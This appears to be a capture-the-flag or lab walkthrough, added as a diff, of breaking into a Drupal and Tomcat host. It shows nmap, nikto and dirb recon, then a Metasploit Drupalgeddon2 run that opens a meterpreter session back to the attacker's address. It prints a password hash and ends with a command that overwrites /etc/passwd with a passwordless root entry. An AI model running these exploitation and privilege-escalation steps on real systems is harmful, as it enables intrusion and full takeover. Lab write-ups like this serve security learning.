@@ -1,0 +1,121 @@
+
+$netdiscover -i wlp2s0
+192.168.1.11
+
+$nmap -sV 192.168.1.11 -p- -Pn -T5
+
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp    open  ssl/http Apache/2.4.7 (Ubuntu)
+111/tcp   open  rpcbind  2-4 (RPC #100000)
+8080/tcp  open  http     Apache Tomcat/Coyote JSP engine 1.1
+50039/tcp open  status   1 (RPC #100024)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+$ nikto -h http://192.168.1.11:8080
+
+--------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ Server leaks inodes via ETags, header found with file /, fields: 0xW/1895 0x1527957628000 
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ /: Appears to be a default Apache Tomcat install.
++ Cookie JSESSIONID created without the httponly flag
++ /manager/html: Default Tomcat Manager interface found
++ 6544 items checked: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2020-05-04 01:53:37 (GMT3) (9 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+nikto says that put method is allowed , we maybe able to upload a shell
+
+lets keep searching about the target
+
+
+$nikto -h http://192.168.1.11
+
++ Server: Apache/2.4.7 (Ubuntu)
++ Retrieved x-powered-by header: PHP/5.6.36-1+ubuntu14.04.1+deb.sury.org+1
++ Uncommon header 'x-generator' found, with contents: Drupal 8 (https://www.drupal.org)
++ Uncommon header 'x-drupal-dynamic-cache' found, with contents: MISS
++ Uncommon header 'x-content-type-options' found, with contents: nosniff
++ Uncommon header 'x-ua-compatible' found, with contents: IE=edge
++ Uncommon header 'x-drupal-cache' found, with contents: HIT
++ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x63c 0x553905d398500 
++ File/dir '/README.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/search/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
++ File/dir '/user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/index.php/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/index.php/search/' in robots.txt returned a non-forbidden or redirect HTTP code (302)
++ File/dir '/index.php/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/index.php/user/register/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ File/dir '/index.php/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 40 entries which should be manually viewed.
++ Allowed HTTP Methods: GET, POST 
+
+
+
+$ dirb http://192.168.1.11/
+
+---- Scanning URL: http://192.168.1.11/ ----
++ http://192.168.1.11/admin (CODE:403|SIZE:7952)                               
++ http://192.168.1.11/Admin (CODE:403|SIZE:7952)                               
++ http://192.168.1.11/ADMIN (CODE:403|SIZE:7952)                               
++ http://192.168.1.11/batch (CODE:403|SIZE:7952) 
+
+
+$ dirb http://192.168.1.11:8080
+
+---- Scanning URL: http://192.168.1.11:8080/ ----
+==> DIRECTORY: http://192.168.1.11:8080/host-manager/                          
++ http://192.168.1.11:8080/index.html (CODE:200|SIZE:1895)                     
+==> DIRECTORY: http://192.168.1.11:8080/manager/                               
+                                                          
+
+
+
+# the website on port 80 uses drupal lets look up for some drupal rce exploits
+
+I found one exploit/unix/webapp/drupal_drupalgeddon2 from metasploitable
+
+$ msfconsole
+$use exploit/unix/webapp/drupal_drupalgeddon2
+
+$set rhosts 192.168.1.11
+$set lhost 192.168.1.67 
+$run
+
+and we got a meterpreter session opened to ourselves
+
+lets have the normal shell
+$shell
+
+
+When I tryied to read /etc/passwd to see users I found that a system user
+indishell's password was stored in that file instead of /etc/shadow file
+
+indishell:$6$AunCdsxZ$OBxuMf0a/GqstthT4LEW8RGZxepGL7C3jHMk/IFyhLCTJ/.0fo/9Aa.s134i80zAr1HtdyICiogwDAXzG0NWZ0:1000:1000:indishell,,,:/home/indishell:/bin/bash
+          
+lets see the users rights of that file 
+
+$ ls -la /etc/passwd
+
+-rwxrwxrwx 1 root root 2606 Jun 10  2018 /etc/passwd
+
+we can right to this file and it contains hashed version of indishell user
+
+echo root::0:0:root:/root:/bin/bash > /etc/passwd
+
+now you can login to root without password
+
